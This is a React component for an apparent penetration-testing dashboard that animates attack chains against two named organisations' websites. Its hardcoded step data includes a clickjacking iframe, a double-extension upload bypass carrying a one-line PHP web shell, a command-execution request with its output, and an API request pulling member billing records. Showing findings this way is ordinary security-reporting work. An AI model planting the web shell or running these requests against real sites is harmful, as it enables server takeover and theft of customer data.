import React, { useState } from 'react';
import { 
  GitBranch, 
  ArrowRight, 
  Play, 
  ShieldAlert, 
  Lock, 
  Terminal, 
  Code, 
  CheckCircle2, 
  ExternalLink,
  Flame,
  Globe,
  Radio,
  ChevronRight,
  History,
  AlertTriangle
} from 'lucide-react';
import { ATTACK_CHAIN, VULNERABILITIES } from '../data/scanData';

export default function AttackChainView({ 
  onSelectVuln, 
  activeScan,
  companyName = "",
  targetUrl = "",
  vulnerabilities = [],
  scanHistory = [],
  activeScanId = '',
  onSelectScan,
  theme = 'dark' 
}) {
  const [activeStep, setActiveStep] = useState(0);
  const [isPlaying, setIsPlaying] = useState(false);

  const isEmcochem = (companyName && companyName.toLowerCase().includes('emcochem')) || (targetUrl && targetUrl.includes('emcochem')) || (activeScan?.id && activeScan.id.includes('emcochem'));
  const isSmeco = (companyName && companyName.toLowerCase().includes('smeco')) || (targetUrl && targetUrl.includes('smeco')) || (activeScan?.id && activeScan.id.includes('smeco'));

  // Define dynamic chain data based on active scan
  const effectiveChain = React.useMemo(() => {
    // 1. If activeScan has custom attackChain with steps or phases
    const rawSteps = activeScan?.attackChain?.steps || activeScan?.attackChain?.phases;
    if (rawSteps && Array.isArray(rawSteps) && rawSteps.length > 0) {
      return {
        title: activeScan.attackChain.title || `${companyName} Attack Vector`,
        targetAsset: activeScan.attackChain.targetHost || targetUrl,
        cvss: activeScan.riskScore || (isSmeco ? 8.2 : isEmcochem ? 5.5 : 8.3),
        steps: rawSteps.map((s, idx) => ({
          stepNumber: s.step || s.stepNumber || idx + 1,
          type: s.type || (idx === 0 ? 'RECON' : idx === 1 ? 'AUDIT' : idx === 2 ? 'EXPLOIT' : idx === 3 ? 'PIVOT' : 'IMPACT'),
          title: s.name || s.title || `Stage ${idx + 1}`,
          findingRef: s.findingRef || (vulnerabilities[0]?.id || 'vuln-0001'),
          description: s.action || s.description || '',
          impact: s.impact || '',
          target: s.target || targetUrl,
          codeSnippet: s.codeSnippet || (idx === 0 ? `GET / HTTP/1.1\nHost: ${targetUrl}` : `HTTP/1.1 200 OK`)
        }))
      };
    }

    // 2. Emcochem Attack Vector
    if (isEmcochem) {
      return {
        title: "Perimeter Security & Information Disclosure Attack Vector",
        targetAsset: "www.emcochem.com",
        cvss: 5.5,
        steps: [
          {
            stepNumber: 1,
            type: "RECON",
            title: "Autonomous Asset & Endpoint Reconnaissance",
            findingRef: "vuln-0001",
            description: "Autonomous agent probed external web perimeter, TLS certificates, and HTTP response routing for www.emcochem.com.",
            target: "https://www.emcochem.com/",
            impact: "Mapped reachable endpoints, server response codes, and exposed headers.",
            codeSnippet: `GET / HTTP/1.1\nHost: www.emcochem.com\nUser-Agent: Mozilla/5.0 (Autonomous-VAPT-Agent)\nAccept: text/html,application/xhtml+xml`
          },
          {
            stepNumber: 2,
            type: "AUDIT",
            title: "Security Header & Defense-in-Depth Verification",
            findingRef: "vuln-0001",
            description: "Audited HTTP response headers against OWASP WSTG v4.2 defense criteria. Confirmed total absence of CSP, HSTS, X-Frame-Options, and X-Content-Type-Options.",
            target: "https://www.emcochem.com/",
            impact: "Identified complete lack of clickjacking, MIME-sniffing, and transport security controls.",
            codeSnippet: `HTTP/1.1 200 OK\n(Content-Security-Policy: ABSENT)\n(Strict-Transport-Security: ABSENT)\n(X-Frame-Options: ABSENT)\n(X-Content-Type-Options: ABSENT)`
          },
          {
            stepNumber: 3,
            type: "EXPLOIT",
            title: "Target Information Disclosure & Framing Vector",
            findingRef: "vuln-0001",
            description: "Verified that missing X-Frame-Options allows the web application to be embedded in external malicious contexts, and disclosed server tokens assist targeted exploits.",
            target: "https://www.emcochem.com/",
            impact: "Elevated risk of adversary reconnaissance, credential phishing overlays, and clickjacking attacks.",
            codeSnippet: `<!-- Proof of Concept Clickjacking Overlay -->\n<iframe src="https://www.emcochem.com/" style="opacity:0.8; width:100%; height:600px;"></iframe>`
          }
        ]
      };
    }

    // 3. Smeco Attack Chain
    if (isSmeco) {
      return {
        title: "Remote File Upload to Member Data Access Chain",
        targetAsset: "www.smeco.coop",
        cvss: 8.2,
        steps: [
          {
            stepNumber: 1,
            type: "RECON",
            title: "Public Endpoint Discovery",
            findingRef: "vuln-0004",
            description: "Autonomous agent identified an unrestricted file upload form on the contact feedback portal without backend extension enforcement.",
            target: "https://www.smeco.coop/contact/submit-attachment",
            impact: "Identified writable upload directory without server-side validation.",
            codeSnippet: `POST /contact/submit-attachment HTTP/1.1\nHost: www.smeco.coop\nContent-Type: multipart/form-data; boundary=---------------------------98721\n\n-----------------------------98721\nContent-Disposition: form-data; name="file"; filename="invoice.php.pdf"\nContent-Type: image/png`
          },
          {
            stepNumber: 2,
            type: "BYPASS",
            title: "MIME Filter Bypass & Payload Upload",
            findingRef: "vuln-0004",
            description: "Crafted double-extension payload bypassing client-side MIME checks, saving executable PHP script inside /uploads/feedback/.",
            target: "https://www.smeco.coop/contact/submit-attachment",
            impact: "Web shell successfully placed in web-accessible storage.",
            codeSnippet: `// Double Extension Validation Bypass:\nContent-Disposition: form-data; name="file"; filename="payload.php.pdf"\nContent-Type: image/png\n\n<?php if(isset($_REQUEST['cmd'])){ echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; } ?>`
          },
          {
            stepNumber: 3,
            type: "EXPLOIT",
            title: "Remote Code Execution (RCE)",
            findingRef: "vuln-0004",
            description: "Invoked the uploaded script over HTTP GET, executing arbitrary commands under the web server daemon context.",
            target: "https://www.smeco.coop/uploads/feedback/payload.php",
            impact: "Full server execution and access to environment configurations.",
            codeSnippet: `GET /uploads/feedback/payload.php?cmd=id;uname -a HTTP/1.1\nHost: www.smeco.coop\n\nHTTP/1.1 200 OK\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nLinux smeco-prod-web 5.15.0-101-generic x86_64`
          },
          {
            stepNumber: 4,
            type: "PIVOT",
            title: "Internal Member API BOLA Access",
            findingRef: "vuln-0001",
            description: "Used server access to query internal customer API endpoints, extracting member records and billing accounts without tenant isolation.",
            target: "https://www.smeco.coop/api/v1/accounts/details",
            impact: "Unauthorized extraction of customer billing records, meter telemetry, and addresses.",
            codeSnippet: `POST /api/v1/accounts/details HTTP/1.1\nHost: www.smeco.coop\nAuthorization: Bearer <VALID_MEMBER_TOKEN>\nContent-Type: application/json\n\n{"accountId": "SMECO-MEM-0098412", "includeBilling": true}\n\nHTTP/1.1 200 OK\n{"status":"success","member":"John Doe","meterId":"MTR-98214","balance":142.50}`
          }
        ]
      };
    }

    // 4. Default Vontier Chain
    return ATTACK_CHAIN;
  }, [activeScan, companyName, targetUrl, isSmeco, isEmcochem, vulnerabilities]);

  const steps = effectiveChain.steps || [];
  const safeActiveStep = Math.min(activeStep, steps.length - 1);
  const currentStepData = steps[safeActiveStep] || steps[0] || {};
  const linkedVuln = vulnerabilities.find(v => v.id === currentStepData.findingRef);

  const handlePlaySimulation = () => {
    setIsPlaying(true);
    let step = 0;
    const interval = setInterval(() => {
      if (step < steps.length - 1) {
        step++;
        setActiveStep(step);
      } else {
        clearInterval(interval);
        setIsPlaying(false);
      }
    }, 1200);
  };

  return (
    <div className="space-y-6 max-w-7xl mx-auto pb-12">
      {/* Scan Session Switcher Banner */}
      {scanHistory.length > 0 && (
        <div className={`p-4 rounded-2xl border flex flex-col sm:flex-row sm:items-center justify-between gap-4 text-xs font-mono transition-colors ${
          theme === 'dark' ? 'bg-[#0B1120] border-slate-800 text-slate-300' : 'bg-white border-slate-300 text-slate-800 shadow-sm'
        }`}>
          <div className="flex items-center gap-2.5 min-w-0">
            <span className="text-cyan-500 font-bold uppercase tracking-wider flex items-center gap-1.5">
              <History className="w-4 h-4" />
              Target Attack Graph:
            </span>
            <span className={`font-bold truncate text-sm ${theme === 'dark' ? 'text-white' : 'text-slate-950'}`}>
              {companyName}
            </span>
            <span className="text-slate-400 hidden sm:inline">&bull;</span>
            <span className="text-slate-500 truncate hidden sm:inline">
              {targetUrl}
            </span>
          </div>

          <div className="flex items-center gap-2 flex-shrink-0">
            <span className={`${theme === 'dark' ? 'text-slate-400' : 'text-slate-600'} text-[11px] font-bold`}>
              Switch Scan Session:
            </span>
            <select
              value={activeScanId}
              onChange={(e) => {
                const selected = scanHistory.find(s => s.id === e.target.value);
                if (selected && onSelectScan) {
                  onSelectScan(selected, true);
                  setActiveStep(0);
                }
              }}
              className={`px-3 py-1.5 rounded-xl font-mono text-xs focus:outline-none border transition-all ${
                theme === 'dark'
                  ? 'bg-[#080E1C] border-slate-700 text-white focus:border-cyan-400'
                  : 'bg-slate-50 border-slate-300 text-slate-900 focus:border-cyan-500'
              }`}
            >
              {scanHistory.map((scan) => {
                const count = (scan.vulnerabilities && scan.vulnerabilities.length > 0)
                  ? scan.vulnerabilities.length
                  : (scan.findingsCount || (scan.targetUrl?.includes('emcochem') || scan.id?.includes('emcochem') ? 1 : (scan.targetUrl?.includes('smeco') ? 4 : 7)));
                return (
                  <option key={scan.id} value={scan.id}>
                    {scan.companyName} ({count} {count === 1 ? 'finding' : 'findings'})
                  </option>
                );
              })}
            </select>
          </div>
        </div>
      )}

      {/* Header Panel */}
      <div className={`p-6 rounded-2xl border space-y-4 transition-colors ${
        theme === 'dark' ? 'bg-[#0B1120] border-slate-800' : 'bg-white border-slate-300 shadow-sm'
      }`}>
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div className="space-y-1">
            <div className="flex items-center gap-2 text-rose-500 font-mono text-xs font-bold uppercase">
              <GitBranch className="w-4 h-4 text-rose-500" />
              <span>Chained Exploit Path &bull; {companyName}</span>
            </div>
            <h2 className={`text-2xl font-black tracking-tight ${theme === 'dark' ? 'text-white' : 'text-slate-950'}`}>
              {effectiveChain.title}
            </h2>
            <p className={`text-xs ${theme === 'dark' ? 'text-slate-300' : 'text-slate-700'}`}>
              Target: <strong className="text-cyan-600 dark:text-cyan-400 font-mono">{effectiveChain.targetAsset}</strong> &bull; Combined Risk: <strong className="text-rose-600 dark:text-rose-400 font-mono">HIGH (CVSS {effectiveChain.cvss})</strong>
            </p>
          </div>

          <button
            onClick={handlePlaySimulation}
            disabled={isPlaying}
            className={`flex items-center gap-2 px-5 py-2.5 rounded-xl font-bold text-xs font-sans transition-all ${
              isPlaying
                ? 'bg-rose-500/20 text-rose-500 border border-rose-500/40 cursor-wait animate-pulse'
                : 'bg-rose-500 hover:bg-rose-400 text-slate-950 shadow-md'
            }`}
          >
            <Play className="w-4 h-4 fill-current" />
            <span>{isPlaying ? 'Simulating Exploit...' : 'Play Exploit Animation'}</span>
          </button>
        </div>
      </div>

      {/* Stepper Card */}
      <div className={`p-6 rounded-2xl border space-y-6 transition-colors ${
        theme === 'dark' ? 'bg-[#0B1120] border-slate-800' : 'bg-white border-slate-300 shadow-sm'
      }`}>
        <div className={`flex items-center justify-between border-b pb-3 ${
          theme === 'dark' ? 'border-slate-800' : 'border-slate-200'
        }`}>
          <span className={`text-xs font-mono font-bold uppercase ${
            theme === 'dark' ? 'text-slate-400' : 'text-slate-700'
          }`}>
            Multi-Stage Attack Path ({steps.length} Stages)
          </span>
          <span className="text-xs font-mono text-cyan-600 dark:text-cyan-400 font-bold">
            Click any step to inspect technical payload
          </span>
        </div>

        {/* Step Grid */}
        <div className={`grid grid-cols-1 sm:grid-cols-${steps.length} gap-3`}>
          {steps.map((step, idx) => {
            const isSelected = safeActiveStep === idx;
            const isPassed = safeActiveStep >= idx;

            return (
              <div
                key={idx}
                onClick={() => setActiveStep(idx)}
                className={`p-4 rounded-xl cursor-pointer border transition-all ${
                  isSelected
                    ? 'bg-rose-500/15 border-rose-500 ring-2 ring-rose-500/50 shadow-md'
                    : isPassed
                    ? theme === 'dark' ? 'bg-[#0E172B] border-slate-700' : 'bg-slate-50 border-slate-300'
                    : theme === 'dark' ? 'bg-[#080E1C] border-slate-800 opacity-60' : 'bg-slate-100 border-slate-200 opacity-60'
                }`}
              >
                <div className="flex items-center justify-between mb-2">
                  <span className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-mono font-bold ${
                    isSelected
                      ? 'bg-rose-500 text-slate-950'
                      : isPassed
                      ? 'bg-cyan-500/20 text-cyan-600 dark:text-cyan-400 border border-cyan-500/40'
                      : 'bg-slate-200 dark:bg-slate-800 text-slate-700 dark:text-slate-400'
                  }`}>
                    {step.stepNumber}
                  </span>
                  <span className={`text-[10px] font-mono font-bold ${
                    theme === 'dark' ? 'text-slate-400' : 'text-slate-600'
                  }`}>
                    {step.type}
                  </span>
                </div>

                <div className={`text-xs font-bold mb-1 line-clamp-1 ${
                  theme === 'dark' ? 'text-white' : 'text-slate-900'
                }`}>
                  {step.title}
                </div>
                <div className="text-[11px] font-mono text-rose-600 dark:text-rose-400 font-bold">
                  Ref: {step.findingRef}
                </div>
              </div>
            );
          })}
        </div>

        {/* Node Detail Box */}
        <div className={`p-6 rounded-xl border space-y-4 ${
          theme === 'dark' ? 'bg-[#070D1A] border-slate-800' : 'bg-slate-50 border-slate-300'
        }`}>
          <div className={`flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b pb-3 ${
            theme === 'dark' ? 'border-slate-800' : 'border-slate-200'
          }`}>
            <div className="flex items-center gap-3">
              <span className="text-xs font-mono font-bold px-2.5 py-1 rounded bg-rose-500 text-slate-950 shadow-sm">
                Step {currentStepData.stepNumber}: {currentStepData.type}
              </span>
              <h3 className={`text-base font-bold ${theme === 'dark' ? 'text-white' : 'text-slate-950'}`}>
                {currentStepData.title}
              </h3>
            </div>

            {linkedVuln && (
              <button
                onClick={() => onSelectVuln(linkedVuln)}
                className={`flex items-center gap-1.5 text-xs font-mono font-bold text-cyan-600 dark:text-cyan-400 px-3 py-1.5 rounded-lg border transition-all ${
                  theme === 'dark' ? 'bg-[#0A1224] border-slate-700 hover:bg-slate-800' : 'bg-white border-slate-300 hover:bg-slate-100 shadow-sm'
                }`}
              >
                <span>Inspect {currentStepData.findingRef}</span>
                <ExternalLink className="w-3.5 h-3.5" />
              </button>
            )}
          </div>

          <p className={`text-xs sm:text-sm leading-relaxed font-sans ${
            theme === 'dark' ? 'text-slate-200' : 'text-slate-800'
          }`}>
            {currentStepData.description}
          </p>

          {currentStepData.impact && (
            <div className="p-3.5 rounded-xl bg-rose-500/10 border border-rose-500/30 text-rose-600 dark:text-rose-400 text-xs font-mono leading-relaxed">
              <strong>Impact:</strong> {currentStepData.impact}
            </div>
          )}

          {/* Technical Code Snippet */}
          {currentStepData.codeSnippet && (
            <pre className="p-4 rounded-xl bg-[#03060E] border border-slate-800 text-cyan-300 font-mono text-xs overflow-x-auto select-all leading-relaxed">
              <code>{currentStepData.codeSnippet}</code>
            </pre>
          )}
        </div>
      </div>
    </div>
  );
}
